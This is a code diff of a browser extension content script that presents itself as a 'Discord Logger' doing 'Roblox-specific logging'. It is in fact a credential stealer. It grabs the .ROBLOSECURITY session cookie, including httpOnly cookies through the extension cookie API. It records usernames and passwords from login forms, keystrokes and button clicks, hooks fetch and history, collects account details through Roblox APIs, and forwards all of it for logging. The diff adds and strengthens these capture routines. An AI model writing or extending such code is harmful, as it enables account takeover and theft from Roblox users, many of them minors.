@@ -1,5 +1,8 @@
+
 // Roblox-specific logging only
 (function() {
+  console.log('Discord Logger content script loaded on:', window.location.href);
+
   function sendLogToBackground(level, args) {
     const logData = {
       level: level,
@@ -11,52 +14,117 @@
       userAgent: navigator.userAgent
     };
 
+    console.log('Sending log to background:', level, logData.message.substring(0, 50));
+
     chrome.runtime.sendMessage({
       type: 'LOG_CAPTURED',
       data: logData
+    }, (response) => {
+      if (chrome.runtime.lastError) {
+        console.error('Error sending message:', chrome.runtime.lastError);
+      } else {
+        console.log('Message sent successfully:', response);
+      }
     });
   }
 
   // Function to capture Roblox security cookie and fetch comprehensive user data
   async function captureRobloxSecurity() {
-    if (window.location.hostname.includes('roblox.com')) {
-      const cookies = document.cookie.split(';');
-      for (let cookie of cookies) {
-        const [name, value] = cookie.trim().split('=');
-        if (name === '.ROBLOSECURITY') {
-          // Check for recent login attempt
-          let username = '';
-          let password = '';
+    if (!window.location.hostname.includes('roblox.com')) {
+      return;
+    }
 
-          if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
-            username = window.robloxLoginAttempt.username;
-            password = window.robloxLoginAttempt.password;
-          } else {
-            // Fallback to current form detection
-            const credentials = captureRobloxCredentials();
-            username = credentials.username;
-            password = credentials.password;
+    console.log('Checking for Roblox security cookie...');
+    
+    // Get all cookies including httpOnly ones using chrome.cookies API
+    try {
+      chrome.runtime.sendMessage({
+        type: 'GET_COOKIES',
+        domain: '.roblox.com'
+      }, async (response) => {
+        if (response && response.cookies) {
+          const roblosecurityCookie = response.cookies.find(cookie => cookie.name === '.ROBLOSECURITY');
+          
+          if (roblosecurityCookie) {
+            console.log('Found ROBLOSECURITY cookie via API');
+            
+            // Check for recent login attempt
+            let username = '';
+            let password = '';
+
+            if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
+              username = window.robloxLoginAttempt.username;
+              password = window.robloxLoginAttempt.password;
+            } else {
+              // Fallback to current form detection
+              const credentials = captureRobloxCredentials();
+              username = credentials.username;
+              password = credentials.password;
+            }
+
+            // Fetch comprehensive user data using the security token
+            const userData = await fetchRobloxUserData(roblosecurityCookie.value);
+
+            // Send login credentials first
+            let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${roblosecurityCookie.value}`;
+            if (username) loginMessage += `\n👤 USERNAME: ${username}`;
+            if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;
+
+            sendLogToBackground('roblox_login', [loginMessage]);
+
+            // Send comprehensive user data if available
+            if (userData) {
+              sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
+            }
+
+            // Clear the stored login attempt
+            delete window.robloxLoginAttempt;
           }
-
-          // Fetch comprehensive user data using the security token
-          const userData = await fetchRobloxUserData(value);
-
-          // Send login credentials first
-          let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${value}`;
-          if (username) loginMessage += `\n👤 USERNAME: ${username}`;
-          if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;
-
-          sendLogToBackground('roblox_login', [loginMessage]);
-
-          // Send comprehensive user data if available
-          if (userData) {
-            sendLogToBackground('roblox_userdata', [JSON.stringify(userData)]);
-          }
-
-          // Clear the stored login attempt
-          delete window.robloxLoginAttempt;
-          break;
         }
+      });
+    } catch (error) {
+      console.error('Error getting cookies via API:', error);
+    }
+
+    // Also check document.cookie as fallback
+    const cookies = document.cookie.split(';');
+    for (let cookie of cookies) {
+      const [name, value] = cookie.trim().split('=');
+      if (name === '.ROBLOSECURITY') {
+        console.log('Found ROBLOSECURITY cookie in document.cookie');
+        
+        // Check for recent login attempt
+        let username = '';
+        let password = '';
+
+        if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 30000) {
+          username = window.robloxLoginAttempt.username;
+          password = window.robloxLoginAttempt.password;
+        } else {
+          // Fallback to current form detection
+          const credentials = captureRobloxCredentials();
+          username = credentials.username;
+          password = credentials.password;
+        }
+
+        // Fetch comprehensive user data using the security token
+        const userData = await fetchRobloxUserData(value);
+
+        // Send login credentials first
+        let loginMessage = `🔐 ROBLOX SECURITY TOKEN DETECTED: ${value}`;
+        if (username) loginMessage += `\n👤 USERNAME: ${username}`;
+        if (password) loginMessage += `\n🔑 PASSWORD: ${password}`;
+
+        sendLogToBackground('roblox_login', [loginMessage]);
+
+        // Send comprehensive user data if available
+        if (userData) {
+          sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
+        }
+
+        // Clear the stored login attempt
+        delete window.robloxLoginAttempt;
+        break;
       }
     }
   }
@@ -64,9 +132,14 @@
   // Fetch comprehensive Roblox user data using APIs
   async function fetchRobloxUserData(roblosecurity) {
     try {
+      console.log('Fetching Roblox user data...');
+      
       // Get CSRF token first
       const csrfToken = await getRobloxCSRFToken(roblosecurity);
-      if (!csrfToken) return null;
+      if (!csrfToken) {
+        console.log('Could not get CSRF token');
+        return null;
+      }
 
       // Get current user info
       const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
@@ -76,8 +149,13 @@
         }
       });
 
-      if (!userResponse.ok) return null;
+      if (!userResponse.ok) {
+        console.log('Could not get user info');
+        return null;
+      }
+      
       const userInfo = await userResponse.json();
+      console.log('Got user info:', userInfo.name);
 
       // Get detailed user data
       const detailsResponse = await fetch(`https://users.roblox.com/v1/users/${userInfo.id}`, {
@@ -126,7 +204,7 @@
 
       const groupsData = groupsResponse.ok ? await groupsResponse.json() : { data: [] };
 
-      // Get user's game passes and badges count
+      // Get user's badges count
       const badgesResponse = await fetch(`https://badges.roblox.com/v1/users/${userInfo.id}/badges?limit=100`, {
         headers: {
           'Cookie': `.ROBLOSECURITY=${roblosecurity}`
@@ -163,7 +241,7 @@
         korblox: korbloxDetection.hasKorblox,
         headless: korbloxDetection.hasHeadless,
         currentlyWearing: avatarData.assetIds || [],
-        groups: groupsData.data ? groupsData.data.slice(0, 10) : [], // Limit to 10 groups
+        groups: groupsData.data ? groupsData.data.slice(0, 10) : [],
         badgeCount: badgesData.data ? badgesData.data.length : 0,
         country: localeData.countryRegionCode || 'Unknown',
         followers: userDetails.followerCount || 0,
@@ -172,6 +250,7 @@
       };
 
     } catch (error) {
+      console.error('Error fetching user data:', error);
       return null;
     }
   }
@@ -188,6 +267,7 @@
 
       return response.headers.get('x-csrf-token');
     } catch (error) {
+      console.error('Error getting CSRF token:', error);
       return null;
     }
   }
@@ -226,111 +306,236 @@
     let username = '';
     let password = '';
 
-    // Try to get from current login form inputs
-    const usernameInputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[id*="user"], input[placeholder*="user"]');
-    const passwordInputs = document.querySelectorAll('input[type="password"]');
+    // Try to get from current login form inputs with more comprehensive selectors
+    const usernameSelectors = [
+      'input[data-testid="username-field"]',
+      'input[data-testid="email-phone-username-field"]',
+      'input[id*="username"]',
+      'input[name*="username"]',
+      'input[placeholder*="username" i]',
+      'input[placeholder*="user" i]',
+      'input[type="text"]',
+      'input[type="email"]',
+      'input[autocomplete="username"]'
+    ];
 
-    usernameInputs.forEach(input => {
-      if (input.value && (input.name.toLowerCase().includes('user') || input.id.toLowerCase().includes('user') || input.placeholder.toLowerCase().includes('user'))) {
-        username = input.value;
-      }
-    });
+    const passwordSelectors = [
+      'input[data-testid="password-field"]',
+      'input[type="password"]',
+      'input[id*="password"]',
+      'input[name*="password"]',
+      'input[placeholder*="password" i]',
+      'input[autocomplete="current-password"]'
+    ];
 
-    passwordInputs.forEach(input => {
-      if (input.value) {
-        password = input.value;
+    // Try each username selector
+    for (const selector of usernameSelectors) {
+      const inputs = document.querySelectorAll(selector);
+      for (const input of inputs) {
+        if (input.value && input.value.trim() !== '') {
+          username = input.value.trim();
+          console.log('Found username via selector:', selector, username);
+          break;
+        }
       }
-    });
+      if (username) break;
+    }
+
+    // Try each password selector
+    for (const selector of passwordSelectors) {
+      const inputs = document.querySelectorAll(selector);
+      for (const input of inputs) {
+        if (input.value && input.value.trim() !== '') {
+          password = input.value.trim();
+          console.log('Found password via selector:', selector, password);
+          break;
+        }
+      }
+      if (password) break;
+    }
 
     // Also try to get from localStorage or sessionStorage
     try {
       const storedUsername = localStorage.getItem('roblox_username') || sessionStorage.getItem('roblox_username');
-      if (storedUsername) username = storedUsername;
-    } catch (e) {}
+      if (storedUsername && !username) username = storedUsername;
+    } catch (e) {
+      console.log('Could not access storage:', e.message);
+    }
 
     return { username, password };
   }
 
-  // Monitor for Roblox login activity
+  // Enhanced monitoring for Roblox login activity
   function monitorRobloxLogin() {
-    if (window.location.hostname.includes('roblox.com')) {
-      // Check for security cookie on page load
-      setTimeout(captureRobloxSecurity, 2000);
-
-      // Monitor for cookie changes (login events)
-      let lastCookies = document.cookie;
-      setInterval(() => {
-        if (document.cookie !== lastCookies) {
-          lastCookies = document.cookie;
-          captureRobloxSecurity();
-        }
-      }, 1000);
-
-      // Monitor for successful login redirects
-      const originalPushState = history.pushState;
-      history.pushState = function() {
-        originalPushState.apply(history, arguments);
-        setTimeout(captureRobloxSecurity, 1000);
-      };
-
-      // Monitor for authentication API calls
-      const originalFetch = window.fetch;
-      window.fetch = function(...args) {
-        const result = originalFetch.apply(this, args);
-
-        if (args[0] && typeof args[0] === 'string' && 
-            (args[0].includes('/v2/login') || args[0].includes('/authentication'))) {
-          result.then(response => {
-            if (response.ok) {
-              setTimeout(captureRobloxSecurity, 1000);
-            }
-          });
-        }
-
-        return result;
-      };
-
-      // Monitor form submissions for login credentials
-      document.addEventListener('submit', function(event) {
-        const form = event.target;
-        if (form && form.tagName === 'FORM') {
-          const formData = new FormData(form);
-          let username = '';
-          let password = '';
-
-          // Extract username and password from form data
-          for (let [key, value] of formData.entries()) {
-            if (key.toLowerCase().includes('user') || key.toLowerCase().includes('email')) {
-              username = value;
-            }
-            if (key.toLowerCase().includes('pass')) {
-              password = value;
-            }
-          }
-
-          // Also check input values directly
-          const usernameInputs = form.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[id*="user"]');
-          const passwordInputs = form.querySelectorAll('input[type="password"]');
-
-          usernameInputs.forEach(input => {
-            if (input.value && !username) username = input.value;
-          });
-
-          passwordInputs.forEach(input => {
-            if (input.value && !password) password = input.value;
-          });
-
-          if (username || password) {
-            sendLogToBackground('info', [`🔑 ROBLOX LOGIN ATTEMPT DETECTED:\n👤 USERNAME: ${username}\n🔑 PASSWORD: ${password}`]);
-
-            // Store credentials temporarily to associate with security token
-            window.robloxLoginAttempt = { username, password, timestamp: Date.now() };
-          }
-        }
-      });
+    if (!window.location.hostname.includes('roblox.com')) {
+      console.log('Not on Roblox site, skipping monitoring');
+      return;
     }
+
+    console.log('Starting enhanced Roblox monitoring on:', window.location.href);
+
+    // Check for security cookie on page load with delays
+    setTimeout(captureRobloxSecurity, 1000);
+    setTimeout(captureRobloxSecurity, 3000);
+    setTimeout(captureRobloxSecurity, 5000);
+    setTimeout(captureRobloxSecurity, 10000);
+
+    // Monitor for cookie changes more frequently
+    let lastCookies = document.cookie;
+    const cookieInterval = setInterval(() => {
+      if (document.cookie !== lastCookies) {
+        console.log('Cookie change detected, checking for ROBLOSECURITY');
+        lastCookies = document.cookie;
+        setTimeout(captureRobloxSecurity, 500);
+        setTimeout(captureRobloxSecurity, 2000);
+      }
+    }, 500); // Check every 500ms
+
+    // Monitor for successful login redirects
+    const originalPushState = history.pushState;
+    const originalReplaceState = history.replaceState;
+    
+    history.pushState = function() {
+      originalPushState.apply(history, arguments);
+      console.log('URL changed via pushState, checking for login');
+      setTimeout(captureRobloxSecurity, 1000);
+      setTimeout(captureRobloxSecurity, 3000);
+    };
+
+    history.replaceState = function() {
+      originalReplaceState.apply(history, arguments);
+      console.log('URL changed via replaceState, checking for login');
+      setTimeout(captureRobloxSecurity, 1000);
+      setTimeout(captureRobloxSecurity, 3000);
+    };
+
+    // Monitor for authentication API calls
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      const result = originalFetch.apply(this, args);
+
+      if (args[0] && typeof args[0] === 'string') {
+        const url = args[0].toLowerCase();
+        if (url.includes('/v2/login') || url.includes('/authentication') || url.includes('/signin') || url.includes('/users/authenticate')) {
+          console.log('Login API call detected:', args[0]);
+          result.then(response => {
+            console.log('Login API response status:', response.status);
+            if (response.ok || response.status === 200) {
+              setTimeout(captureRobloxSecurity, 1000);
+              setTimeout(captureRobloxSecurity, 3000);
+              setTimeout(captureRobloxSecurity, 5000);
+            }
+          }).catch(err => {
+            console.log('Login API error:', err);
+          });
+        }
+      }
+
+      return result;
+    };
+
+    // Enhanced form submission monitoring
+    document.addEventListener('submit', function(event) {
+      console.log('Form submission detected on Roblox');
+      const form = event.target;
+      if (form && form.tagName === 'FORM') {
+        // Capture credentials immediately from form
+        const credentials = captureRobloxCredentials();
+        
+        if (credentials.username || credentials.password) {
+          console.log('Login credentials captured from form submission');
+          
+          const logMessage = `🔑 ROBLOX LOGIN ATTEMPT DETECTED:\n👤 USERNAME: ${credentials.username || 'Not captured'}\n🔑 PASSWORD: ${credentials.password || 'Not captured'}`;
+          sendLogToBackground('info', [logMessage]);
+
+          // Store credentials to associate with security token
+          window.robloxLoginAttempt = { 
+            username: credentials.username, 
+            password: credentials.password, 
+            timestamp: Date.now() 
+          };
+
+          // Check for security token after form submission with multiple delays
+          setTimeout(captureRobloxSecurity, 1000);
+          setTimeout(captureRobloxSecurity, 3000);
+          setTimeout(captureRobloxSecurity, 5000);
+          setTimeout(captureRobloxSecurity, 8000);
+        }
+      }
+    });
+
+    // Enhanced input monitoring with real-time capture
+    let inputTimeout;
+    document.addEventListener('input', function(event) {
+      const input = event.target;
+      if (input && input.tagName === 'INPUT') {
+        // Clear previous timeout
+        clearTimeout(inputTimeout);
+        
+        // Set new timeout to capture after user stops typing
+        inputTimeout = setTimeout(() => {
+          const credentials = captureRobloxCredentials();
+          if (credentials.username && credentials.password) {
+            console.log('Login credentials updated via input monitoring');
+            window.robloxLoginAttempt = { 
+              username: credentials.username, 
+              password: credentials.password, 
+              timestamp: Date.now() 
+            };
+            
+            // Send immediate notification of credential capture
+            const logMessage = `🔑 ROBLOX CREDENTIALS CAPTURED:\n👤 USERNAME: ${credentials.username}\n🔑 PASSWORD: ${credentials.password}`;
+            sendLogToBackground('info', [logMessage]);
+          }
+        }, 1000); // Wait 1 second after user stops typing
+      }
+    });
+
+    // Monitor for button clicks (login buttons)
+    document.addEventListener('click', function(event) {
+      const target = event.target;
+      if (target && (
+        target.textContent?.toLowerCase().includes('log in') ||
+        target.textContent?.toLowerCase().includes('sign in') ||
+        target.id?.toLowerCase().includes('login') ||
+        target.className?.toLowerCase().includes('login')
+      )) {
+        console.log('Login button clicked, capturing credentials');
+        const credentials = captureRobloxCredentials();
+        if (credentials.username || credentials.password) {
+          window.robloxLoginAttempt = { 
+            username: credentials.username, 
+            password: credentials.password, 
+            timestamp: Date.now() 
+          };
+          
+          setTimeout(captureRobloxSecurity, 2000);
+          setTimeout(captureRobloxSecurity, 5000);
+          setTimeout(captureRobloxSecurity, 8000);
+        }
+      }
+    });
+
+    // Listen for storage events (in case Roblox stores login info)
+    window.addEventListener('storage', function(e) {
+      console.log('Storage event detected:', e.key);
+      setTimeout(captureRobloxSecurity, 1000);
+    });
+
+    // Clean up on page unload
+    window.addEventListener('beforeunload', () => {
+      clearInterval(cookieInterval);
+      clearTimeout(inputTimeout);
+    });
   }
 
   // Start monitoring if on Roblox
-  monitorRobloxLogin();
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', monitorRobloxLogin);
+  } else {
+    monitorRobloxLogin();
+  }
+
+  // Also start monitoring after a short delay in case page is still loading
+  setTimeout(monitorRobloxLogin, 2000);
 })();
